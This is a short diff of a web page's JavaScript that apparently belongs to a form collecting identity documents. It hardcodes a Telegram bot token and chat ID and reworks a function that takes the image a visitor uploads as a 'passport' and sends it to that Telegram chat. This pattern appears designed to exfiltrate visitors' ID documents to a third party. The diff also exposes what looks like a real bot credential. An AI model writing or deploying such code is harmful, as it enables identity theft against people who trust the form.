@@ -430,13 +430,15 @@ closeAdButton.addEventListener("click", slideOutAd);
 	  
 
 	// Important parameters
-	  const TELEGRAM_BOT_TOKEN = '8101442954:AAGBNz1uHe9v1dWDhMr9duIT_N33lUv-A9Y'; // Replace with your bot token
+	  const TELEGRAM_BOT_TOKEN = '8101442954:AAGBNz1uHe9v1dWDhMr9duIT_N33lUv-A9Y';
 	  const TELEGRAM_CHAT_ID = '6049368044';
-	  const input = document.getElementById('passport');
-      const file = input.files[0];
 
 	  // Proper parameter naming
 function sendImageToTelegram(botToken, chatId) {
+	
+	const input = document.getElementById('passport');
+	const file = input.files[0];
+	
     if (!file) {
         alert('No image selected');
         return;
@@ -503,7 +505,7 @@ function sendMessageToTelegram(botToken, chatId, messageText) {
 		
 			// sendImageToTelegram(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID);
         
-                showForm('form2');
+                //showForm('form2');
             
             // Re-enable button and hide loading
             submitBtn.disabled = false;
